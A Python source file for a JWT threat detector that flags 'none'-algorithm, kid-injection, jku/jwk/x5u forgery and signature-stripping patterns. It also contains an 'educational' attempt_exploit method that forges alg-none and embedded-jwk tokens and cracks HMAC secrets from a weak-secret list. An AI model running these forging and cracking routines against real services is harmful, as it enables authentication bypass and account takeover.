import re
import json
import base64
import hmac
import hashlib
from typing import Dict, Any, List, Optional

class ThreatDetector:
    """
    Detects potential security threats and attack patterns in JWT tokens.
    This implementation doesn't rely on external JWT libraries.
    """
    
    def __init__(self):
        self.threats = []
    
    def detect(self, token_data: Dict[str, Any], raw_token: str) -> List[Dict[str, Any]]:
        """
        Analyze the token for potential security threats.
        
        Args:
            token_data: Parsed token data from TokenParser
            raw_token: The original raw JWT token string
            
        Returns:
            List of detected threats with severity and description
        """
        self.threats = []
        
        # Check for token tampering
        self._check_tampering(token_data, raw_token)
        
        # Check for known attack patterns
        self._check_known_attacks(token_data)
        
        # Check for suspicious modifications
        self._check_suspicious_modifications(token_data)
        
        # Check for indicators of brute force attempts
        self._check_brute_force_indicators(token_data)
        
        # Check for token forgery attempts
        self._check_forgery_attempts(token_data, raw_token)
        
        return self.threats
    
    def _check_tampering(self, token_data: Dict[str, Any], raw_token: str):
        """Check for signs of token tampering."""
        # Verify token structure
        parts = raw_token.split('.')
        if len(parts) != 3:
            self._add_threat(
                "malformed_token",
                "Token does not follow the standard JWT format of header.payload.signature",
                "High",
                "The token appears to be tampered with or improperly formatted."
            )
            return
        
        # Verify header values match decoded data
        try:
            header_part = parts[0]
            padding_needed = len(header_part) % 4
            if padding_needed:
                header_part += '=' * (4 - padding_needed)
            header_part = header_part.replace('-', '+').replace('_', '/')
            decoded_header = json.loads(base64.b64decode(header_part).decode('utf-8'))
            
            if decoded_header != token_data.get("header", {}):
                self._add_threat(
                    "header_mismatch",
                    "Decoded header doesn't match the token's actual header",
                    "Critical",
                    "This suggests the token has been tampered with or manipulated."
                )
        except Exception:
            self._add_threat(
                "header_decode_failure",
                "Failed to decode the token header properly",
                "High",
                "This could indicate token manipulation or corruption."
            )
    
    def _check_known_attacks(self, token_data: Dict[str, Any]):
        """Check for known JWT attack patterns."""
        header = token_data.get("header", {})
        payload = token_data.get("payload", {})
        
        # Check for 'none' algorithm attack
        if header.get("alg", "").lower() == "none":
            self._add_threat(
                "none_algorithm_attack",
                "Token uses the 'none' algorithm, which is vulnerable to signature bypass",
                "Critical",
                "This is a known attack pattern where attackers try to bypass signature verification."
            )
        
        # Check for algorithm confusion attack
        if header.get("alg", "").startswith("HS") and "kid" in header:
            kid = header.get("kid", "")
            if any(pattern in kid.lower() for pattern in ["../", "file:", "https:", "http:", "\\", "/"]):
                self._add_threat(
                    "algorithm_confusion_attack",
                    "Potential key identification injection in the 'kid' parameter",
                    "Critical",
                    "The 'kid' header parameter contains suspicious patterns that may be used "
                    "for directory traversal or resource injection attacks."
                )
        
        # Check for blank password attack
        if header.get("alg", "").startswith("HS") and token_data.get("signature", "") in ["", "==", "AA=="]:
            self._add_threat(
                "blank_password_attack",
                "Token has empty or minimal signature, possibly signed with empty secret",
                "Critical",
                "This may be an attempt to exploit implementations that accept tokens signed with empty secrets."
            )
            
        # Check for known library-specific exploits
        if "jku" in header:
            self._add_threat(
                "jku_header_attack",
                "Token uses 'jku' header for key location",
                "High",
                "The 'jku' header can be used in some libraries to point to attacker-controlled JWK sets."
            )
    
    def _check_suspicious_modifications(self, token_data: Dict[str, Any]):
        """Check for suspicious modifications to the token."""
        payload = token_data.get("payload", {})
        header = token_data.get("header", {})
        
        # Check for role-related modifications
        if any(key.lower() in ["role", "roles", "permissions", "groups", "scopes"] for key in payload.keys()):
            # Look for suspicious role escalation patterns
            role_keys = [key for key in payload.keys() if key.lower() in ["role", "roles", "permissions", "groups", "scopes"]]
            for key in role_keys:
                value = payload[key]
                
                # Check for array to string conversion that might bypass type checks
                if isinstance(value, str) and any(char in value for char in ['[', ']', '{', '}']):
                    try:
                        parsed = json.loads(value)
                        if isinstance(parsed, (list, dict)):
                            self._add_threat(
                                "role_type_confusion",
                                f"Suspicious role format in '{key}' that may bypass type checks",
                                "High",
                                "This may be an attempt to confuse role validation by using a string that contains JSON data."
                            )
                    except:
                        pass
        
        # Check for JWT ID reuse (cannot detect across multiple tokens in this implementation)
        if "jti" not in payload:
            self._add_threat(
                "missing_jti",
                "Token does not have a JWT ID (jti) claim",
                "Medium",
                "Without a unique identifier, it's harder to implement token revocation and detect token reuse."
            )
    
    def _check_brute_force_indicators(self, token_data: Dict[str, Any]):
        """Check for indicators that might suggest brute force attempts."""
        # This is limited in a single-token context but can look for patterns
        # that might indicate the token has been part of brute force attempts
        
        header = token_data.get("header", {})
        
        # Check for simplified/customized JWT format that might be used in brute forcing
        if header.get("alg") == "HS256" and len(token_data.get("signature", "")) < 16:
            self._add_threat(
                "potential_brute_force",
                "Token has unusually short signature that may indicate brute force attempts",
                "Medium",
                "Short signatures can be a sign of attempting to brute force the secret key."
            )
    
    def _check_forgery_attempts(self, token_data: Dict[str, Any], raw_token: str):
        """Check for potential token forgery attempts."""
        header = token_data.get("header", {})
        payload = token_data.get("payload", {})
        
        # Check for header parameters that can be used in forgery
        suspect_headers = ["x5u", "x5c", "jku", "jwk"]
        for param in suspect_headers:
            if param in header:
                self._add_threat(
                    f"{param}_header_forgery",
                    f"Token uses '{param}' header which can be used for key manipulation",
                    "High",
                    f"The '{param}' header can be manipulated to make the token validate against attacker-controlled keys."
                )
        
        # Check for embedded keys in header (jwk header)
        if "jwk" in header:
            self._add_threat(
                "embedded_key",
                "Token contains an embedded JWK in the header",
                "Critical",
                "This could be an attempt to make the token validate against an attacker-provided key."
            )
        
        # Check for potential signature stripping
        parts = raw_token.split('.')
        if len(parts) == 3 and not parts[2]:
            self._add_threat(
                "signature_stripping",
                "Token has an empty signature part",
                "Critical",
                "This may be an attempt to bypass signature verification."
            )
    
    def _add_threat(self, id: str, title: str, severity: str, description: str):
        """Add a threat to the list of findings."""
        self.threats.append({
            "id": id,
            "title": title,
            "severity": severity,
            "description": description
        })
    
    def attempt_exploit(self, raw_token: str) -> Dict[str, Any]:
        """
        Attempt to exploit common JWT vulnerabilities on the token.
        This is for educational purposes and to demonstrate how attackers might exploit weaknesses.
        
        Args:
            raw_token: The raw JWT token string
            
        Returns:
            Dictionary with exploit results
        """
        exploits = {}
        
        # Try none algorithm exploit
        none_alg_token = self._try_none_algorithm_exploit(raw_token)
        exploits["none_algorithm"] = {
            "success": none_alg_token is not None,
            "modified_token": none_alg_token if none_alg_token else None,
            "description": "Attempted to bypass signature validation by changing algorithm to 'none'"
        }
        
        # Try header manipulation
        header_manipulation = self._try_header_manipulation(raw_token)
        exploits["header_manipulation"] = {
            "success": header_manipulation is not None,
            "modified_token": header_manipulation if header_manipulation else None,
            "description": "Attempted to manipulate header parameters"
        }
        
        # Try weak key brute force (simplified)
        weak_key_token = self._try_weak_key_exploit(raw_token)
        exploits["weak_key"] = {
            "success": weak_key_token != False,
            "cracked_secret": weak_key_token if weak_key_token else None,
            "description": "Attempted to crack the token using common weak secrets"
        }
        
        return exploits
    
    def _try_none_algorithm_exploit(self, raw_token: str) -> Optional[str]:
        """Try to exploit the 'none' algorithm vulnerability."""
        try:
            parts = raw_token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header
            header_part = parts[0]
            padding_needed = len(header_part) % 4
            if padding_needed:
                header_part += '=' * (4 - padding_needed)
            header_part = header_part.replace('-', '+').replace('_', '/')
            header = json.loads(base64.b64decode(header_part).decode('utf-8'))
            
            # Modify algorithm to 'none'
            header["alg"] = "none"
            
            # Re-encode header
            modified_header = base64.b64encode(json.dumps(header).encode()).decode()
            modified_header = modified_header.replace('+', '-').replace('/', '_').rstrip('=')
            
            # Create exploit token with empty signature
            exploit_token = f"{modified_header}.{parts[1]}."
            return exploit_token
        except Exception:
            return None
    
    def _try_header_manipulation(self, raw_token: str) -> Optional[str]:
        """Try to exploit header manipulation vulnerabilities."""
        try:
            parts = raw_token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header
            header_part = parts[0]
            padding_needed = len(header_part) % 4
            if padding_needed:
                header_part += '=' * (4 - padding_needed)
            header_part = header_part.replace('-', '+').replace('_', '/')
            header = json.loads(base64.b64decode(header_part).decode('utf-8'))
            
            # Try adding a jwk parameter with an empty key
            header["jwk"] = {"kty": "oct", "k": ""}
            
            # Re-encode header
            modified_header = base64.b64encode(json.dumps(header).encode()).decode()
            modified_header = modified_header.replace('+', '-').replace('/', '_').rstrip('=')
            
            # Create exploit token
            exploit_token = f"{modified_header}.{parts[1]}.{parts[2]}"
            return exploit_token
        except Exception:
            return None
    
    def _try_weak_key_exploit(self, raw_token: str) -> Any:
        """
        Try to crack the token using common weak secrets.
        This is a simplified demonstration and would be more comprehensive in a real tool.
        
        Returns:
            The cracked secret if successful, False otherwise
        """
        try:
            # List of common weak secrets to try
            common_secrets = [
                "secret", "password", "1234", "admin", "key", "private", 
                "weak_secret", "test", "demo", "development", "prod", "production",
                "jwt_secret", "jwt_key", "api_key", "token_secret", "app_secret"
            ]
            
            parts = raw_token.split('.')
            if len(parts) != 3:
                return False
                
            # Try to decode with common weak secrets
            message = f"{parts[0]}.{parts[1]}".encode('ascii')
            signature_to_check = self._base64url_decode(parts[2])
            
            # Try each weak key
            for secret in common_secrets:
                try:
                    # Calculate signature with this secret
                    calculated_signature = hmac.new(
                        secret.encode('utf-8'),
                        message,
                        digestmod=hashlib.sha256
                    ).digest()
                    
                    # Compare signatures
                    if hmac.compare_digest(calculated_signature, signature_to_check):
                        return secret
                except Exception:
                    continue
                    
            return False
        except Exception:
            return False
    
    def _base64url_decode(self, input: str) -> bytes:
        """Decode base64url-encoded string to bytes."""
        # Add padding if necessary
        rem = len(input) % 4
        if rem > 0:
            input += '=' * (4 - rem)
        
        # Replace URL safe characters
        input = input.replace('-', '+').replace('_', '/')
        
        # Decode
        return base64.b64decode(input)